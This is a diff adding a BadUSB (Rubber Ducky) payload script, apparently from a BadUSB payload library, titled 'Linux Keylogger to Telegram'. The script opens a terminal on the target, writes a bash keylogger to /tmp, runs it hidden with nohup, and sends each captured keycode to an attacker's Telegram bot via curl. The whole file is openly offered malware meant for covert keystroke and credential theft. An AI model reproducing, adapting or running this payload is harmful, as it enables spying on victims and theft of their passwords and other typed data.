@@ -1,0 +1,36 @@
+REM Title: Linux Keylogger to Telegram
+REM Author: BadUSB Library
+REM Description: Logs keystrokes and sends to Telegram
+REM Target: Linux
+REM Category: Authentication
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create keylogger
+STRING cat > /tmp/keylogger.sh << 'EOF'
+#!/bin/bash
+BOT_TOKEN="TELEGRAM_BOT_TOKEN"
+CHAT_ID="TELEGRAM_CHAT_ID"
+while true; do
+    key=$(xinput test-xi2 --root | grep -o 'keycode [0-9]*' | tail -1)
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" -d chat_id="${CHAT_ID}" -d text="Key: $key"
+    sleep 1
+done
+EOF
+ENTER
+
+STRING chmod +x /tmp/keylogger.sh
+ENTER
+STRING nohup /tmp/keylogger.sh > /dev/null 2>&1 &
+ENTER
